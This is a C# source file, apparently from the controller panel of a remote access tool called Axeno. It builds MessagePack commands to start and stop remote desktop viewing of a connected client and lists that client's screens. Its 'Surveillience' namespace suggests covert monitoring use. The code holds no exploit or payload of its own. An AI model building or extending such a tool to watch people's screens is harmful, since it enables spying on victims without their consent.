using Axeno.MessagePack;
using Axeno.Networking.Connection;

using Axeno.Views.Pages.ClientManager;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media.Imaging;

namespace Axeno.Networking.Functions.Surveillience
{
    internal class RemoteDesktopFunction
    {
        public static byte[] Start(int quality, int screen)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "RemoteDesktop";
            msgpack.ForcePathObject("Option").AsString = "startRDP";
            msgpack.ForcePathObject("Quality").AsInteger = quality;
            msgpack.ForcePathObject("Screen").AsInteger = screen;

            return msgpack.Encode2Bytes();
        }
        public static byte[] Stop()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "RemoteDesktop";
            msgpack.ForcePathObject("Option").AsString = "stopRDP";
            return msgpack.Encode2Bytes();
        }
        public static byte[] GetInfo()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "RemoteDesktop";
            msgpack.ForcePathObject("Option").AsString = "GetInfo";
            return msgpack.Encode2Bytes();
        }
        public void Handle(Client cli, MsgPack msgpack)
        {
            int screen = Convert.ToInt32(msgpack.ForcePathObject("Screens").AsInteger);
            for (int i = 0; i < screen; i++)
            {
                cli.Rdp.cmbScreens.Items.Add("Screen " + i);
            }
            cli.Rdp.cmbScreens.SelectedIndex = 0;
        }
    }
}
